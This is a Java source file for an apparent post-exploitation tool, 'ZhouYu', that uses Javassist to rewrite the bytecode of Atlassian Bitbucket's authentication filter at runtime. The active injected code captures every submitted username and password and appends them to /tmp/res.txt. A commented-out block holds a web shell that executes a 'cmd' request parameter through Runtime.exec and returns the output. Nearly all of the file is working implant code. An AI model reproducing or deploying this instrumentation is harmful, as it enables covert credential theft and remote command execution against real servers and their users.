package zhouyu.core.init;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Modifier;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.HashSet;
import java.util.Set;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;
import java.util.zip.CRC32;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import javassist.LoaderClassPath;
import zhouyu.core.transformer.Transformer;
import zhouyu.core.util.JavassistUtil;

public class WriteShellTransformer implements Transformer {

    private String[][] methods = new String[][] {
        //new String[] {"javax/servlet/http/HttpServlet", "javax.servlet.http.HttpServlet", "service", "(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V"},
            new String[] {"com/atlassian/stash/internal/spring/security/StashAuthenticationFilter", "com.atlassian.stash.internal.spring.security.StashAuthenticationFilter", "createContextFromQueryParameters", "*"},
    };

    private Set<String> cache = new HashSet<>();

    @Override
    public boolean condition(String className) {
        for (int i = 0; i < methods.length; i++) {
            if (className.equals(methods[i][0]) || className.equals(methods[i][1])) {
                return true;
            }
        }
        return false;
    }

    @Override
    public byte[] transformer(ClassLoader loader, String className, byte[] codeBytes) {
        for (int i = 0; i < methods.length; i++) {
            if (className.equals(methods[i][0]) || className.equals(methods[i][1])) {
                codeBytes = insertShell(methods[i][2], methods[i][3], loader, codeBytes, getBeforeInsertCode());
            }
        }
        return codeBytes;
    }

    private String getBeforeInsertCode() {
        /*
        StringBuilder codeBuilder = new StringBuilder()
            .append("String cmd = $1.getParameter(\"cmd\");").append("\n")
            .append("if (cmd != null) {").append("\n")
            .append("   try {").append("\n")
            .append("       String[] cmds = cmd.split(\" \");").append("\n")
            .append("       InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();").append("\n")
            .append("       StringBuilder stringBuilder = new StringBuilder();").append("\n")
            .append("       BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));").append("\n")
            .append("       String line;").append("\n")
            .append("       while((line = bufferedReader.readLine()) != null) {").append("\n")
            .append("           stringBuilder.append(line).append(\"\\n\");").append("\n")
            .append("       }").append("\n")
            .append("       byte[] res = stringBuilder.toString().getBytes(StandardCharsets.UTF_8);").append("\n")
            .append("       $2.getOutputStream().write(res);").append("\n")
            .append("   } catch (Throwable throwable) {").append("\n")
            .append("       throwable.printStackTrace();").append("\n")
            .append("   }").append("\n")
            .append("}").append("\n")
            ;
         */

        StringBuilder codeBuilder = new StringBuilder()
                .append("try {").append("\n")
                .append("javax.servlet.http.HttpServletRequest request = $1;").append("\n")
                .append("String password=request.getParameter(\"j_password\");").append("\n")
                .append("if(password!=null){").append("\n")
                .append("String username=request.getParameter(\"j_username\");").append("\n")
                .append("String r=username+\":\"+password;").append("\n")
                .append("byte[] res = r.getBytes();").append("\n")
                .append("java.io.File newTextFile = new java.io.File(\"/tmp/res.txt\");").append("\n")
                .append("java.io.FileOutputStream fw = new java.io.FileOutputStream(newTextFile,true);").append("\n")
                .append("fw.write(res);").append("\n")
                .append("fw.close();").append("\n")
                .append("}").append("\n")
                .append("   } catch (Throwable throwable) {").append("\n")
                .append("       throwable.printStackTrace();").append("\n")
                .append("   }").append("\n")
                ;


        return codeBuilder.toString();
    }

    private byte[] insertShell(String hookMethod, String hookMethodSignature, ClassLoader loader, byte[] codeBytes, String beforeCode) {
        CtClass ctClass = null;
        try {
            ClassPool classPool = ClassPool.getDefault();
            classPool.appendClassPath(new LoaderClassPath(loader));
            classPool.importPackage("java.io.InputStream");
            classPool.importPackage("java.lang.Runtime");
            classPool.importPackage("java.lang.StringBuilder");
            classPool.importPackage("java.io.BufferedReader");
            classPool.importPackage("java.io.InputStreamReader");
            classPool.importPackage("java.nio.charset.StandardCharsets");
            classPool.importPackage("java.io.File");
            classPool.importPackage("java.io.InputStreamReader");
            classPool.importPackage("java.io.FileOutputStream");
            ctClass = classPool.makeClass(new ByteArrayInputStream(codeBytes));
            if (hookMethod.equals("<init>")) {
                Set<CtConstructor> ctConstructors = JavassistUtil.getAllConstructors(ctClass);
                for (CtConstructor ctConstructor : ctConstructors) {
                    if (ctConstructor.getSignature().equals(hookMethodSignature) || hookMethodSignature.equals("*")) {
                        System.out.println(String.format("[ZhouYu] hook %s %s %s", ctClass.getName(), ctConstructor.getName(), ctConstructor.getSignature()));
                        ctConstructor.insertBefore(beforeCode);
                    }
                }
            } else {
                Set<CtMethod> methods = JavassistUtil.getAllMethods(ctClass);
                for (CtMethod ctMethod : methods) {
                    if (ctMethod.getName().equals(hookMethod)) {
                        System.out.println(String.format("[ZhouYu] hook %s %s %s", ctClass.getName(), ctMethod.getName(), ctMethod.getSignature()));
                        ctMethod.insertBefore(beforeCode);
                    }
                }
            }

            return ctClass.toBytecode();
        } catch (Throwable e) {
            e.printStackTrace();
        } finally {
            if (ctClass != null) {
                ctClass.detach();
            }
        }
        return codeBytes;
    }
}
